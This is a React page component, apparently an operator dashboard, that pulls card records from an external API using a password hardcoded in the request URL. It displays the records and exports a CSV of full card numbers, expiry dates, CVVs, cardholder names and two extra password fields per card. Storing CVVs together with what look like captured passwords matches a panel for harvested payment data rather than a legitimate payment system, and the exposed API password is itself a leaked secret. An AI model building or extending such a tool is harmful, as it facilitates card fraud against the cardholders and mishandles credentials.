"use client"
import { useState, useEffect } from 'react';
import { Download, AlertCircle, Loader } from 'lucide-react';

const Page = () => {
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch('https://api.partner.kashishindiapvtltd.com/import/read?password=Gulshan*8340GK');
        if (!response.ok) {
          throw new Error('Failed to fetch data');
        }
        const result = await response.json();
        setData(result.data);
        setLoading(false);
      } catch (error) {
        setError(error.message);
        setLoading(false);
      }
    };
    fetchData();
  }, []);

  const exportToXLSX = () => {
    if (data.length === 0) {
      alert('No data to export');
      return;
    }

    // Create CSV content
    const headers = ['Card Number', 'Expiry Date', 'cvv', 'Amount', 'Cardholder Name','cere_password','cere_password_1', 'Pay ID', 'Pay Time', 'Is Done'];
    const csvContent = [
      headers.join(','),
      ...data.map(item =>
        [
          item.card_number,
          item.expiry_date,
          item.cvv,
          item.amount,
          item.cardholder_name,
          item.cere_password,
          item.cere_password_1,
          item.pay_id,
          item.pay_time,
          item.IsDone
        ].map(field => `"${field}"`).join(',')
      )
    ].join('\n');

    // Create blob and download
    const blob = new Blob([csvContent], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' });
    const url = window.URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `card_data_${new Date().toISOString().split('T')[0]}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    window.URL.revokeObjectURL(url);
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
        <div className="text-center">
          <Loader className="w-12 h-12 text-indigo-600 animate-spin mx-auto mb-4" />
          <p className="text-gray-600 text-lg">Loading data...</p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-red-50 to-red-100">
        <div className="text-center bg-white p-8 rounded-lg shadow-lg">
          <AlertCircle className="w-12 h-12 text-red-600 mx-auto mb-4" />
          <p className="text-red-600 text-lg">Error: {error}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-8">
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-4xl font-bold text-gray-800 mb-2">Card Data</h1>
            <p className="text-gray-600">{data.length} records found</p>
          </div>
          <button
            onClick={exportToXLSX}
            className="flex items-center gap-2 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 px-6 rounded-lg transition-colors shadow-lg"
          >
            <Download className="w-5 h-5" />
            Export to Excel
          </button>
        </div>

        <div className="bg-white rounded-lg shadow-lg overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="bg-gradient-to-r from-indigo-600 to-indigo-700 text-white">
                  <th className="px-6 py-4 text-left border font-semibold">Sr No</th>
                  <th className="px-6 py-4 text-left border font-semibold">Card Number</th>
                  <th className="px-6 py-4 text-left  border font-semibold">CSC ID</th>
                  <th className="px-6 py-4 text-left border font-semibold">Pay Time</th>
                  <th className="px-6 py-4 text-left border font-semibold">Status</th>
                </tr>
              </thead>
              <tbody>
                {data.map((item, index) => (
                  <tr
                    key={index}
                    className={`border-b border text-center transition-colors ${
                      index % 2 === 0 ? 'bg-white' : 'bg-gray-50'
                    } hover:bg-indigo-50`}
                  >
                    <td className="px-6 py-4 border text-gray-800 font-mono text-sm">{index+1}</td>
                    <td className="px-6 py-4 border text-gray-800 font-mono text-sm">{item.card_number}</td>
                    <td className="px-6 py-4 border text-gray-700 text-sm">{item.pay_id}</td>
                    <td className="px-6 py-4 border text-gray-700 text-sm">{item.pay_time}</td>
                    <td className="px-6 py-4">
                      <span
                        className={`inline-block px-3 py-1 rounded-full text-sm font-semibold ${
                          item.IsDone
                            ? 'bg-green-100 text-green-800'
                            : 'bg-yellow-100 text-yellow-800'
                        }`}
                      >
                        {item.IsDone ? 'Completed' : 'Pending'}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Page;